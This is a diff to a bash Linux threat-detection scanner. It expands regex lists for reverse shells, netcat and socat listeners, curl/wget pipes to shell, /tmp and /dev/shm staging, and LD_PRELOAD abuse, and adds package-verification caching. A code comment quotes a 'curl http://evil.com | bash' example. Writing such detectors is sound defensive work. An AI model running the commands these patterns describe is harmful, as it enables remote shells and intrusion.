@@ -37,6 +37,11 @@ EUID_CHECK=$(id -u)
 # Format: PKG_CACHE["/path/to/file"]="status:package_name" or "unmanaged"
 declare -A PKG_CACHE
 
+# Performance: File hash + metadata caches to avoid repeated sha256sum/stat calls
+# The same binary/script path can appear in systemd, cron, and autostart checks
+declare -A FILE_HASH_CACHE
+declare -A FILE_METADATA_CACHE
+
 # Performance: Systemctl enabled status cache to avoid repeated calls
 # Format: SYSTEMCTL_CACHE["service_name"]="enabled" or "disabled"
 declare -A SYSTEMCTL_CACHE
@@ -53,12 +58,16 @@ declare -a SUSPICIOUS_NETWORK_PATTERNS=(
     "bash -i >& /dev/udp/"
     "sh -i >\$ /dev/tcp/"
     "sh -i >\$ /dev/udp/"
+    "zsh -i >& /dev/tcp/"             # zsh reverse shell variant
+    "ksh -i >& /dev/tcp/"             # ksh reverse shell variant
     "/bin/bash -c exec 5<>/dev/tcp/"
     "/bin/bash -c exec 5<>/dev/udp/"
-    "nc -e /bin/sh"
+    "nc.*-e.*(sh|bash|dash|zsh)"      # Netcat with any shell execute flag
     "/bin/sh | nc"
+    "nc -k.*-l"                       # Netcat bind shell listener (persistent)
+    "ncat -k.*-l"                     # Ncat bind shell listener (persistent)
     "mknod.*backpipe"
-    "telnet.*bash"
+    "telnet.*\|.*(bash|sh)"           # Telnet piped to any shell
     "socat exec:"
     "xterm -display"
 )
@@ -68,23 +77,42 @@ declare -a SUSPICIOUS_COMMANDS=(
     "curl.*\|.*sh"                # Download and execute via curl
     "wget.*\|.*bash"              # Download and execute via wget
     "wget.*\|.*sh"                # Download and execute via wget
+    "\`curl.*\|.*bash"            # Backtick curl piped to bash
+    "\`curl.*\|.*sh"              # Backtick curl piped to sh
+    "\`wget.*\|.*bash"            # Backtick wget piped to bash
+    "\`wget.*\|.*sh"              # Backtick wget piped to sh
     "curl.* sh -c"                # Download and execute via curl
     "wget.* sh -c"                # Download and execute via wget
     "curl.*-o.*/tmp"              # Download to /tmp via curl
+    "curl.*-o.*/dev/shm"          # Download to /dev/shm via curl
     "wget.*-O.*/tmp"              # Download to /tmp via wget
+    "wget.*-O.*/dev/shm"          # Download to /dev/shm via wget
     "chmod \+x.*/tmp"             # Making /tmp files executable
     "chmod \+x.*/dev/shm"         # Making /dev/shm files executable
-    "chmod 777 "                  # Overly permissive permissions (with trailing space)
+    "chmod 777[[:space:]]"        # Overly permissive permissions (fixed: was trailing-space anchored)
     "base64 -d"                   # Base64 decode (common obfuscation)
     "base64 --decode"             # Base64 decode (long form)
     "eval.*\\\$.*base64"          # Eval with base64 decoded content
     "echo.*\|.*base64.*-d"        # Echo piped to base64 decode
-    "python.*-c.*import"          # Python inline code with imports
+    "python.*-c.*import.*(socket|subprocess|pty|ctypes|os\.system|popen|base64|exec\b|eval\b)"  # Python inline dangerous imports only
+    "python.*-c.*exec\("           # Python inline exec() without import
     "perl -e"                     # Perl inline code
     "ruby -e"                     # Ruby inline code
     "php -r"                      # PHP inline code
     "php.*fsockopen"              # PHP socket connection
     "openssl.*-d.*-base64"        # OpenSSL base64 decode
+    "source .*/tmp/"              # Dot-source script from /tmp staging area
+    "source .*/dev/shm/"          # Dot-source script from /dev/shm
+    "\. .*/tmp/"                  # POSIX dot-source from /tmp
+    "\. .*/dev/shm/"              # POSIX dot-source from /dev/shm
+    "nohup .*/tmp/"               # Background execution of /tmp payload
+    "nohup .*/dev/shm/"           # Background execution of /dev/shm payload
+    "tftp.*-g"                    # TFTP get (worm propagation)
+    "dd if=/tmp/"                 # dd reading from /tmp staging area
+    "dd if=/dev/shm/"             # dd reading from /dev/shm
+    "rev.*\|.*(bash|sh)"          # String reversal decode to shell
+    "tr.*[A-Za-z].*\|.*(bash|sh)" # tr-based cipher decode to shell (ROT13/ROT47)
+    "script.*-q.*/dev/null"       # TTY upgrade technique (post-exploitation)
 )
 
 # Suspicious execution locations - these patterns are checked against file paths
@@ -95,6 +123,7 @@ declare -a SUSPICIOUS_LOCATIONS=(
     "^/var/tmp/"                  # Execution from persistent temp
     "/\.[a-z]"                    # Hidden file/directory (starts with dot)
     "\.\./\.\."                   # Multiple parent traversals (path escape attempt)
+    "^/run/user/"                 # User runtime directory (volatile, world-accessible)
 )
 
 declare -a SUSPICIOUS_FILES=(
@@ -173,25 +202,36 @@ declare -a NEVER_WHITELIST_PATTERNS=(
     "nc .*-e"                    # Netcat with execute flag (alternate syntax)
     "ncat -e"                    # Ncat with execute flag
     "ncat .*-e"                  # Ncat with execute flag (alternate syntax)
+    "busybox nc.*-e"             # Busybox netcat reverse shell
+    "busybox.*(sh|bash).*-[ice]" # Busybox shell inline execution
     "\| *nc "                    # Piping to netcat
-    "\| *bash"                   # Piping to bash
-    "\| *sh "                    # Piping to sh (with space to avoid false positives)
+    "\| *bash\b"                 # Piping to bash (fixed: word boundary, was trailing-space)
+    "\| *sh\b"                   # Piping to sh (fixed: word boundary, was trailing-space)
     "\| */bin/sh"                # Piping to /bin/sh
     "\| */bin/bash"              # Piping to /bin/bash
     ">&[ ]*/dev/"                # Redirecting to /dev/ (reverse shell pattern)
-    "exec [0-9].*socket"         # Bash exec with fd and socket (reverse shell setup)
-    "python.*import socket.*connect"  # Python socket connect (more specific)
-    "python.*socket\.socket"     # Python socket creation (more specific)
-    "perl.*socket.*connect"      # Perl socket connect (more specific)
-    "ruby.*TCPSocket"            # Ruby TCP socket (more specific)
+    "exec [0-9]*<>/dev/"         # Bash exec fd+bidirectional dev redirect (fixed: was dead pattern)
+    "python.*socket\.socket"     # Python socket creation
+    "python.*socket.*connect"    # Python socket connect (removed spurious space requirement)
+    "perl.*socket.*connect"      # Perl socket connect
+    "ruby.*TCPSocket"            # Ruby TCP socket
     "ruby.*Socket\.new"          # Ruby socket creation
     "socat.*exec:"               # Socat with exec (reverse shell)
     "socat.*TCP:"                # Socat TCP connection (potentially malicious)
-    "telnet.*\|.*bash"           # Telnet piped to bash
-    "telnet.*\|.*sh"             # Telnet piped to sh
+    "telnet.*\|.*(bash|sh)"      # Telnet piped to any shell (fixed: was two separate patterns)
     "xterm -display"             # Xterm display redirection (reverse shell)
     "mknod.*backpipe"            # Named pipe for reverse shell
-    "mkfifo.*/tmp"               # Named pipe in /tmp (common for reverse shells)
+    "mkfifo.*/(tmp|dev/shm|var/tmp)"  # Named pipe in staging dirs (fixed: added /dev/shm /var/tmp)
+    "source .*/tmp/"             # Sourcing script from /tmp staging area
+    "source .*/dev/shm/"         # Sourcing script from /dev/shm
+    "\. .*/tmp/"                 # POSIX dot-source from /tmp
+    "\. .*/dev/shm/"             # POSIX dot-source from /dev/shm
+    "script.*-q.*/dev/null"      # TTY upgrade (post-exploitation technique)
+    "rev.*\|.*(bash|sh|exec)"    # String reversal decode to shell
+    "tr.*[A-Za-z].*\|.*(bash|sh)" # tr-based cipher decode to shell (ROT13/ROT47)
+    "eval.*\$\(.*curl"           # eval with curl command substitution (download+exec)
+    "eval.*\$\(.*wget"           # eval with wget command substitution (download+exec)
+    "LD_PRELOAD=.*/(tmp|dev/shm|var/tmp)/"  # LD_PRELOAD pointing to staging dirs
 )
 
 # Multi-line suspicious patterns (for heredocs, split commands, etc.)
@@ -204,11 +244,17 @@ declare -a MULTILINE_SUSPICIOUS_PATTERNS=(
     "eval.*<<.*EOF"               # Eval heredoc
     "python.*-c.*<<.*EOF"         # Python heredoc execution
     "perl.*-e.*<<.*EOF"           # Perl heredoc execution
+    "rev.*\|.*(bash|sh|exec)"     # String reversal decode piped to shell
+    "tr.*['\"].*['\"].*\|.*(bash|sh)"  # tr cipher decode piped to shell (ROT13/ROT47)
+    "dd.*\|.*(bash|sh)"           # dd piped to shell
+    "openssl.*-d.*\|.*(bash|sh)"  # OpenSSL decrypt piped to shell
+    "base64.*-d.*\|.*(bash|sh)"   # Base64 decoded cross-line piped to shell
 )
 
-# Unified quick suspicious content check pattern (used by all modules)
-# This is a single pattern combining the most common indicators for fast detection
-UNIFIED_SUSPICIOUS_PATTERN="curl|wget|nc |netcat|/tmp/|/dev/shm|/dev/tcp|/dev/udp|base64|chmod \\+x|bash -c|sh -c|eval |exec [0-9]"
+# Unified quick suspicious content check pattern (used by all modules).
+# ISC-C1: Auto-derived in build_combined_patterns() from NEVER_WHITELIST + SUSPICIOUS_COMMANDS + SUSPICIOUS_NETWORK arrays.
+# DO NOT hardcode this string here — it is set at startup from the authoritative arrays above.
+UNIFIED_SUSPICIOUS_PATTERN=""
 
 # Check if content matches suspicious patterns
 # Returns: 0 if match found, 1 if no match
@@ -227,6 +273,14 @@ COMBINED_LOCATION_PATTERN=""
 COMBINED_FILE_PATTERN=""
 COMBINED_NEVER_WHITELIST_PATTERN=""
 COMBINED_KNOWN_GOOD_PATHS_PATTERN=""
+COMBINED_MULTILINE_PATTERN=""
+
+# Performance: Package verify cache to avoid re-running dpkg/rpm --verify per package
+# Format: PKG_VERIFY_CACHE["package_name"]="full verify output (may be empty if clean)"
+declare -A PKG_VERIFY_CACHE
+
+# Scan epoch captured once in main() — avoids date +%s subprocess inside per-file loops
+SCAN_EPOCH=0
 
 # Build combined regex patterns for faster matching
 build_combined_patterns() {
@@ -238,6 +292,13 @@ build_combined_patterns() {
     COMBINED_FILE_PATTERN="(${SUSPICIOUS_FILES[*]})"
     COMBINED_NEVER_WHITELIST_PATTERN="(${NEVER_WHITELIST_PATTERNS[*]})"
     COMBINED_KNOWN_GOOD_PATHS_PATTERN="(${KNOWN_GOOD_EXECUTABLE_PATHS[*]})"
+    COMBINED_MULTILINE_PATTERN="(${MULTILINE_SUSPICIOUS_PATTERNS[*]})"
+
+    # ISC-C1 FIX: Auto-derive UNIFIED_SUSPICIOUS_PATTERN from the authoritative arrays.
+    # Previously this was a manually maintained string that diverged silently whenever
+    # new patterns were added to SUSPICIOUS_COMMANDS or NEVER_WHITELIST_PATTERNS.
+    # Now it is built from those combined patterns — zero drift guaranteed.
+    UNIFIED_SUSPICIOUS_PATTERN="${COMBINED_NEVER_WHITELIST_PATTERN}|${COMBINED_COMMAND_PATTERN}|${COMBINED_NETWORK_PATTERN}"
 }
 
 # Helper: Check single category and set match info
@@ -248,14 +309,15 @@ _check_category() {
     shift 3
     local -a patterns=("$@")
 
-    # Fast initial check with combined pattern
-    if ! echo "$content" | grep -qE "$combined_pattern" 2>/dev/null; then
+    # Fast initial check with combined pattern (<<< avoids echo subshell fork)
+    if ! grep -qE "$combined_pattern" <<< "$content" 2>/dev/null; then
         return 1  # No match in this category
     fi
 
     # Found something - now identify which specific pattern matched
     for pattern in "${patterns[@]}"; do
-        local match=$(echo "$content" | grep -oE "$pattern" 2>/dev/null | head -1)
+        local match
+        match=$(grep -oE "$pattern" <<< "$content" 2>/dev/null | head -1) || true
         if [[ -n "$match" ]]; then
             MATCHED_PATTERN="$pattern"
             MATCHED_CATEGORY="$category"
@@ -317,13 +379,15 @@ quick_suspicious_check() {
     local content="$1"
     [[ -z "$content" ]] && return 1
 
-    # Get the full line that contains the match (not just the matched portion)
+    # <<< here-string avoids forking an echo subshell; grep is the only subprocess
     local full_line
-    full_line=$(echo "$content" | grep -iE "$UNIFIED_SUSPICIOUS_PATTERN" | head -1) || true
+    full_line=$(grep -iE "$UNIFIED_SUSPICIOUS_PATTERN" <<< "$content" | head -1) || true
     if [[ -n "$full_line" ]]; then
         MATCHED_PATTERN="unified_suspicious"
-        # Trim leading/trailing whitespace and limit length
-        MATCHED_STRING=$(echo "$full_line" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' | head -c 200)
+        # Bash-native trim (no sed/echo fork): strip leading spaces, trailing spaces, cap at 200
+        full_line="${full_line#"${full_line%%[! ]*}"}"
+        full_line="${full_line%"${full_line##*[! ]}"}"
+        MATCHED_STRING="${full_line:0:200}"
         return 0
     fi
     return 1
@@ -419,21 +483,35 @@ log_finding() {
 # Calculate file hash
 get_file_hash() {
     local file="$1"
-    if [[ -f "$file" ]] && [[ -r "$file" ]]; then
-        sha256sum "$file" 2>/dev/null | awk '{print $1}' || echo "N/A"
-    else
-        echo "N/A"
+    # Return cached result if available (same file may be checked by multiple modules)
+    if [[ -n "${FILE_HASH_CACHE[$file]+isset}" ]]; then
+        echo "${FILE_HASH_CACHE[$file]}"
+        return
     fi
+    local result="N/A"
+    if [[ -f "$file" ]] && [[ -r "$file" ]]; then
+        local hash _
+        read -r hash _ < <(sha256sum "$file" 2>/dev/null) || true
+        result="${hash:-N/A}"
+    fi
+    FILE_HASH_CACHE["$file"]="$result"
+    echo "$result"
 }
 
 # Get file metadata
 get_file_metadata() {
     local file="$1"
-    if [[ -e "$file" ]]; then
-        stat -c "mode:%a|owner:%U:%G|size:%s|modified:%Y|accessed:%X|changed:%Z" "$file" 2>/dev/null || echo "N/A"
-    else
-        echo "N/A"
+    # Return cached result if available (stat is called once per file across all modules)
+    if [[ -n "${FILE_METADATA_CACHE[$file]+isset}" ]]; then
+        echo "${FILE_METADATA_CACHE[$file]}"
+        return
     fi
+    local result="N/A"
+    if [[ -e "$file" ]]; then
+        result=$(stat -c "mode:%a|owner:%U:%G|size:%s|modified:%Y|accessed:%X|changed:%Z" "$file" 2>/dev/null || echo "N/A")
+    fi
+    FILE_METADATA_CACHE["$file"]="$result"
+    echo "$result"
 }
 
 # Initialize systemctl enabled status cache (called once at startup)
@@ -449,10 +527,9 @@ init_systemctl_cache() {
     fi
 
     # Get all unit files and their states in one call
-    while IFS= read -r line; do
-        local unit_name state
-        unit_name=$(echo "$line" | awk '{print $1}')
-        state=$(echo "$line" | awk '{print $2}')
+    # read -r splits columns without spawning awk subshells (unit state [vendor-preset])
+    while read -r unit_name state _; do
+        [[ -z "$unit_name" ]] && continue
 
         # Only cache service units
         if [[ "$unit_name" == *.service ]]; then
@@ -522,6 +599,43 @@ is_package_managed() {
     local result=""
     local ret_code=1
 
+    # Check snap packages - files under /snap/ or /var/lib/snapd/ are snap-managed.
+    # ISC-C9 FIX: Also cover ~/snap/ user installs. Previous check anchored to ^/snap/,
+    # missing /home/user/snap/ and /root/snap/ (user-installed snaps).
+    # Unanchored /snap/ match covers all snap paths without over-matching (snap is a
+    # very specific directory name that doesn't appear in false contexts).
+    if [[ "$file" =~ /snap/ ]] || [[ "$file" =~ ^/var/lib/snapd/ ]]; then
+        result="snap:managed"
+        PKG_CACHE["$file"]="$result"
+        echo "$result"
+        return 0
+    fi
+
+    # Check flatpak packages - files under flatpak dirs are flatpak-managed
+    if [[ "$file" =~ ^/var/lib/flatpak/ ]] || [[ "$file" =~ ^/run/host/usr/ ]]; then
+        result="flatpak:managed"
+        PKG_CACHE["$file"]="$result"
+        echo "$result"
+        return 0
+    fi
+
+    # ISC-C11 FIX: Runtime package managers (npm, pip, cargo) install to paths that
+    # dpkg/rpm don't own. Treat these as "runtime-managed" to reduce FP floods on
+    # developer machines. adjust_confidence_for_package() downgrades these the same
+    # way it handles dpkg-managed files (HIGH→MEDIUM, MEDIUM→LOW).
+    if [[ "$file" =~ /node_modules/ ]] || \
+       [[ "$file" =~ /site-packages/ ]] || \
+       [[ "$file" =~ /dist-packages/ ]] || \
+       [[ "$file" =~ /.cargo/registry/ ]] || \
+       [[ "$file" =~ /.cargo/bin/ ]] || \
+       [[ "$file" =~ /go/pkg/mod/ ]] || \
+       [[ "$file" =~ /gems/gems/ ]]; then
+        result="runtime-managed"
+        PKG_CACHE["$file"]="$result"
+        echo "$result"
+        return 0
+    fi
+
     # Check dpkg (Debian/Ubuntu) - single call to avoid duplicate lookups
     if command -v dpkg &> /dev/null; then
         local dpkg_output
@@ -563,10 +677,19 @@ is_package_managed() {
             local package=$(echo "$dpkg_output" | cut -d':' -f1 | head -n1)
 
             # Verify file hasn't been tampered with
-            # dpkg --verify returns errors if file modified/missing
+            # PKG_VERIFY_CACHE: dpkg --verify scans ALL files in a package — cache by package
+            # name so multiple files from the same package share one verification run
             # Use " $file" (space prefix) to prevent substring false-match on short paths
             # e.g. /usr/bin/py would otherwise match /usr/bin/python3 in verify output
-            local verify_output=$(dpkg --verify "$package" 2>/dev/null | grep -F " $file")
+            local full_verify
+            if [[ -n "${PKG_VERIFY_CACHE[$package]+isset}" ]]; then
+                full_verify="${PKG_VERIFY_CACHE[$package]}"
+            else
+                full_verify=$(dpkg --verify "$package" 2>/dev/null) || true
+                PKG_VERIFY_CACHE["$package"]="$full_verify"
+            fi
+            local verify_output
+            verify_output=$(echo "$full_verify" | grep -F " $file")
             if [[ -n "$verify_output" ]]; then
                 # File has been modified - flag as compromised
                 result="dpkg:$package:MODIFIED"
@@ -599,8 +722,17 @@ is_package_managed() {
             local package=$(echo "$rpm_output" | head -n1)
 
             # Verify file integrity using rpm -V
+            # PKG_VERIFY_CACHE: rpm -V scans ALL files in a package — cache by package name
             # Use " $file" (space prefix) to prevent substring false-match on short paths
-            local verify_output=$(rpm -V "$package" 2>/dev/null | grep -F " $file")
+            local full_verify
+            if [[ -n "${PKG_VERIFY_CACHE[$package]+isset}" ]]; then
+                full_verify="${PKG_VERIFY_CACHE[$package]}"
+            else
+                full_verify=$(rpm -V "$package" 2>/dev/null) || true
+                PKG_VERIFY_CACHE["$package"]="$full_verify"
+            fi
+            local verify_output
+            verify_output=$(echo "$full_verify" | grep -F " $file")
             if [[ -n "$verify_output" ]]; then
                 # File has been modified
                 result="rpm:$package:MODIFIED"
@@ -611,6 +743,40 @@ is_package_managed() {
             fi
 
             # Cache the result
+            PKG_CACHE["$file"]="$result"
+            echo "$result"
+            return $ret_code
+        fi
+    fi
+
+    # Check pacman (Arch Linux / Manjaro / EndeavourOS)
+    if command -v pacman &> /dev/null; then
+        local pacman_output
+        pacman_output=$(pacman -Qo "$file" 2>/dev/null) || true
+
+        if [[ -n "$pacman_output" ]] && [[ "$pacman_output" != *"No package"* ]]; then
+            local package
+            package=$(echo "$pacman_output" | awk '{print $(NF-1)}')
+
+            # Verify with pacman -Qkk (check file integrity for package)
+            # PKG_VERIFY_CACHE: pacman -Qkk scans the whole package — cache by package name
+            local full_verify
+            if [[ -n "${PKG_VERIFY_CACHE[$package]+isset}" ]]; then
+                full_verify="${PKG_VERIFY_CACHE[$package]}"
+            else
+                full_verify=$(pacman -Qkk "$package" 2>/dev/null | grep -v "^warning") || true
+                PKG_VERIFY_CACHE["$package"]="$full_verify"
+            fi
+            local verify_output
+            verify_output=$(echo "$full_verify" | grep -F "$file")
+            if [[ -n "$verify_output" ]]; then
+                result="pacman:$package:MODIFIED"
+                ret_code=2
+            else
+                result="pacman:$package"
+                ret_code=0
+            fi
+
             PKG_CACHE["$file"]="$result"
             echo "$result"
             return $ret_code
@@ -785,16 +951,21 @@ calculate_entropy() {
     if [[ $length -ge 200 ]]; then
         # Check if gzip is available
         if ! command -v gzip &> /dev/null; then
-            # Fallback to AWK Shannon entropy if gzip not available
-            local entropy=$(echo -n "$data" | fold -w1 | sort | uniq -c | awk -v len="$length" '
-                BEGIN { entropy = 0 }
+            # Fallback: single awk pass (1 subprocess vs fold|sort|uniq|awk = 4)
+            local entropy
+            entropy=$(printf '%s' "$data" | awk -v len="$length" '
                 {
-                    freq = $1 / len
-                    if (freq > 0) {
-                        entropy -= freq * log(freq) / log(2)
-                    }
+                    n = length($0)
+                    for (i = 1; i <= n; i++) freq[substr($0, i, 1)]++
                 }
-                END { printf "%.2f", entropy }
+                END {
+                    entropy = 0
+                    for (c in freq) {
+                        p = freq[c] / len
+                        if (p > 0) entropy -= p * log(p) / log(2)
+                    }
+                    printf "%.2f", entropy
+                }
             ')
             echo "$entropy"
             return
@@ -802,17 +973,22 @@ calculate_entropy() {
 
         local compressed_size=$(echo -n "$data" | gzip -c 2>/dev/null | wc -c)
 
-        # Handle gzip failure - fallback to AWK
+        # Handle gzip failure - fallback: single awk pass
         if [[ -z "$compressed_size" ]] || [[ "$compressed_size" -eq 0 ]]; then
-            local entropy=$(echo -n "$data" | fold -w1 | sort | uniq -c | awk -v len="$length" '
-                BEGIN { entropy = 0 }
+            local entropy
+            entropy=$(printf '%s' "$data" | awk -v len="$length" '
                 {
-                    freq = $1 / len
-                    if (freq > 0) {
-                        entropy -= freq * log(freq) / log(2)
-                    }
+                    n = length($0)
+                    for (i = 1; i <= n; i++) freq[substr($0, i, 1)]++
                 }
-                END { printf "%.2f", entropy }
+                END {
+                    entropy = 0
+                    for (c in freq) {
+                        p = freq[c] / len
+                        if (p > 0) entropy -= p * log(p) / log(2)
+                    }
+                    printf "%.2f", entropy
+                }
             ')
             echo "$entropy"
             return
@@ -841,17 +1017,21 @@ calculate_entropy() {
 
         echo "$entropy"
     else
-        # For medium strings (30-199), use AWK Shannon entropy (more accurate)
-        # AWK is better for medium-length strings; gzip only efficient for very long strings
-        local entropy=$(echo -n "$data" | fold -w1 | sort | uniq -c | awk -v len="$length" '
-            BEGIN { entropy = 0 }
+        # For medium strings (30-199): single awk pass replaces fold|sort|uniq|awk (4→1 subprocess)
+        local entropy
+        entropy=$(printf '%s' "$data" | awk -v len="$length" '
             {
-                freq = $1 / len
-                if (freq > 0) {
-                    entropy -= freq * log(freq) / log(2)
-                }
+                n = length($0)
+                for (i = 1; i <= n; i++) freq[substr($0, i, 1)]++
             }
-            END { printf "%.2f", entropy }
+            END {
+                entropy = 0
+                for (c in freq) {
+                    p = freq[c] / len
+                    if (p > 0) entropy -= p * log(p) / log(2)
+                }
+                printf "%.2f", entropy
+            }
         ')
 
         echo "$entropy"
@@ -870,15 +1050,31 @@ is_high_entropy() {
         return 1
     fi
 
-    local entropy=$(calculate_entropy "$string")
-
-    # Use awk for float comparison
-    local is_high=$(awk -v e="$entropy" -v t="$threshold" 'BEGIN { print (e > t) ? 1 : 0 }')
-
-    if [[ "$is_high" -eq 1 ]]; then
-        return 0  # High entropy - suspicious
+    if [[ $length -ge 200 ]]; then
+        # Long strings: use gzip-compression path in calculate_entropy (complex to inline)
+        local entropy
+        entropy=$(calculate_entropy "$string")
+        # Single awk for float comparison only (calculate_entropy already did the heavy work)
+        awk -v e="$entropy" -v t="$threshold" 'BEGIN { exit (e > t) ? 0 : 1 }'
+        return $?
     else
-        return 1  # Normal entropy
+        # Short/medium strings (30-199 chars): single awk does entropy + comparison
+        # Saves one subprocess vs the two-step calculate_entropy → compare pattern
+        printf '%s' "$string" | awk -v len="$length" -v t="$threshold" '
+            {
+                n = length($0)
+                for (i = 1; i <= n; i++) freq[substr($0, i, 1)]++
+            }
+            END {
+                entropy = 0
+                for (c in freq) {
+                    p = freq[c] / len
+                    if (p > 0) entropy -= p * log(p) / log(2)
+                }
+                exit (entropy > t) ? 0 : 1
+            }
+        '
+        return $?
     fi
 }
 
@@ -898,10 +1094,38 @@ analyze_script_content() {
     local script_content
     script_content=$(head -n 1000 "$script_file" 2>/dev/null | tr -d '\0') || true
 
+    # ISC-C3 FIX: Also scan mid-zone and tail for large files.
+    # Previous: head-1000 + tail-200 left lines 1001-to-(N-200) as a blind spot.
+    # Attackers can pad with 800 benign lines, insert payload at 801, then add 600 more.
+    # Solution: add a 200-line mid-zone sample so any zone evasion requires 3x padding.
+    local line_count
+    line_count=$(wc -l < "$script_file" 2>/dev/null || echo 0)
+    if [[ $line_count -gt 1000 ]]; then
+        local tail_content
+        tail_content=$(tail -n 200 "$script_file" 2>/dev/null | tr -d '\0') || true
+        script_content="${script_content}"$'\n'"${tail_content}"
+    fi
+    if [[ $line_count -gt 1200 ]]; then
+        local mid=$((line_count / 2))
+        local mid_start=$(( mid - 100 ))
+        [[ $mid_start -lt 1 ]] && mid_start=1
+        local mid_content
+        mid_content=$(sed -n "${mid_start},$((mid_start + 199))p" "$script_file" 2>/dev/null | tr -d '\0') || true
+        script_content="${script_content}"$'\n'"${mid_content}"
+    fi
+
+    # ISC-C4 FIX: Strip comment lines before pattern matching.
+    # Comment lines (# example: curl http://evil.com | bash) in educational/historical scripts
+    # caused false positives. The entropy loop keeps using raw content (variable assignments
+    # inside comments are noise anyway). All grep pattern checks use script_content_clean.
+    local script_content_clean
+    script_content_clean=$(echo "$script_content" | grep -Ev '^[[:space:]]*#') || true
+
     # Check dangerous patterns using pre-built combined pattern (built once at startup)
+    # Uses script_content_clean (comments stripped) to avoid FP on educational examples
     if [[ -n "$COMBINED_NEVER_WHITELIST_PATTERN" ]]; then
         local full_line
-        full_line=$(echo "$script_content" | grep -iE "$COMBINED_NEVER_WHITELIST_PATTERN" | head -1) || true
+        full_line=$(echo "$script_content_clean" | grep -iE "$COMBINED_NEVER_WHITELIST_PATTERN" | head -1) || true
         if [[ -n "$full_line" ]]; then
             MATCHED_PATTERN="never_whitelist"
             MATCHED_STRING=$(echo "$full_line" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' | head -c 200)
@@ -909,40 +1133,52 @@ analyze_script_content() {
         fi
     fi
 
-    # Combined script-specific suspicious patterns (single grep call)
-    local script_pattern_combined="eval.*\\$|exec.*\\$|\\$\\(curl|\\$\\(wget|base64.*-d|openssl.*enc.*-d|mkfifo|nc.*-l.*-p|socat.*TCP|python.*-c|perl.*-e|ruby.*-e|awk.*system|/proc/self/exe|chmod.*\\+x.*tmp|chmod.*777"
+    # ISC-C2 FIX: Use COMBINED_COMMAND_PATTERN (auto-built from SUSPICIOUS_COMMANDS array)
+    # instead of the orphan hand-maintained script_pattern_combined string.
+    # This ensures analyze_script_content() is always in sync with SUSPICIOUS_COMMANDS.
+    if [[ -n "$COMBINED_COMMAND_PATTERN" ]]; then
+        local full_line
+        full_line=$(echo "$script_content_clean" | grep -iE "$COMBINED_COMMAND_PATTERN" | head -1) || true
+        if [[ -n "$full_line" ]]; then
+            MATCHED_PATTERN="script_suspicious"
+            MATCHED_STRING=$(echo "$full_line" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' | head -c 200)
 
-    local full_line
-    full_line=$(echo "$script_content" | grep -iE "$script_pattern_combined" | head -1) || true
-    if [[ -n "$full_line" ]]; then
-        MATCHED_PATTERN="script_suspicious"
-        # Trim whitespace and limit length for readability
-        MATCHED_STRING=$(echo "$full_line" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' | head -c 200)
-        return 0  # SUSPICIOUS - found dangerous script pattern
+            # ISC-C6 FIX: If the matched line contains an interpreter -c/-e flag, extract
+            # and deeply analyze the inline code argument. analyze_cron_command() already does
+            # this; now analyze_script_content() does too, catching obfuscated payloads inside
+            # bash -c '...', python -c '...', perl -e '...' etc. embedded in script files.
+            if echo "$full_line" | grep -qiE '(bash|sh|dash|zsh|python[0-9.]*|perl[0-9.]*|ruby[0-9.]*)[[:space:]].*-[ce][[:space:]]'; then
+                if analyze_inline_code "$full_line"; then
+                    MATCHED_PATTERN="script_suspicious+inline:${INLINE_CODE_REASON}"
+                fi
+            fi
+
+            return 0  # SUSPICIOUS - found dangerous script pattern
+        fi
     fi
 
-    # Check for multi-line suspicious patterns (heredocs, split commands)
+    # Check for multi-line suspicious patterns using pre-built combined pattern (1 grep vs N)
     # Uses tr to convert newlines to spaces for cross-line matching
+    # Uses script_content_clean (comments stripped) to avoid FP on commented examples
     local content_single_line
-    content_single_line=$(echo "$script_content" | tr '\n' ' ')
-    for pattern in "${MULTILINE_SUSPICIOUS_PATTERNS[@]}"; do
+    content_single_line=$(echo "$script_content_clean" | tr '\n' ' ')
+    if [[ -n "$COMBINED_MULTILINE_PATTERN" ]]; then
         local full_line
-        full_line=$(echo "$content_single_line" | grep -iE "$pattern" | head -1) || true
+        full_line=$(echo "$content_single_line" | grep -iE "$COMBINED_MULTILINE_PATTERN" | head -1) || true
         if [[ -n "$full_line" ]]; then
             MATCHED_PATTERN="multiline_suspicious"
-            # Limit length for multiline matches
             MATCHED_STRING=$(echo "$full_line" | head -c 200)
             return 0  # SUSPICIOUS - found multi-line dangerous pattern
         fi
-    done
+    fi
 
     # Check for encoding-based obfuscation (hex/octal/ANSI-C encoding)
     # Legitimate scripts have no reason to encode strings this way.
-    # 4+ consecutive escape sequences = intentional encoding, not accidental.
+    # 4+ consecutive hex/octal = intentional encoding. 2+ ANSI-C sequences = intentional.
 
     # Hex escape sequences: \x41\x42\x43 (shell/perl/python style)
     local hex_line
-    hex_line=$(echo "$script_content" | grep -E '(\\x[0-9a-fA-F]{2}){4,}' | head -1) || true
+    hex_line=$(echo "$script_content_clean" | grep -E '(\\x[0-9a-fA-F]{2}){4,}' | head -1) || true
     if [[ -n "$hex_line" ]]; then
         MATCHED_PATTERN="hex_encoding"
         MATCHED_STRING=$(echo "$hex_line" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' | head -c 200)
@@ -951,7 +1187,7 @@ analyze_script_content() {
 
     # Octal escape sequences: \101\102\060 (shell/perl style)
     local octal_line
-    octal_line=$(echo "$script_content" | grep -E '(\\[0-7]{3}){4,}' | head -1) || true
+    octal_line=$(echo "$script_content_clean" | grep -E '(\\[0-7]{3}){4,}' | head -1) || true
     if [[ -n "$octal_line" ]]; then
         MATCHED_PATTERN="octal_encoding"
         MATCHED_STRING=$(echo "$octal_line" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' | head -c 200)
@@ -959,12 +1195,46 @@ analyze_script_content() {
     fi
 
     # ANSI-C quoting: $'\x41\x62\x63' (bash-specific hex encoding in strings)
+    # Threshold lowered from {3,} to {2,}: 2 encoded chars is already intentional
+    # Short payloads like $'\x62\x61\x73\x68' ("bash") were previously missed at {3,}
     local ansi_line
-    ansi_line=$(echo "$script_content" | grep -E "\\\$'(\\\\x[0-9a-fA-F]{2}|\\\\[0-7]{3}){3,}'" | head -1) || true
+    ansi_line=$(echo "$script_content_clean" | grep -E "\\\$'(\\\\x[0-9a-fA-F]{2}|\\\\[0-7]{3}){2,}'" | head -1) || true
     if [[ -n "$ansi_line" ]]; then
         MATCHED_PATTERN="ansi_c_encoding"
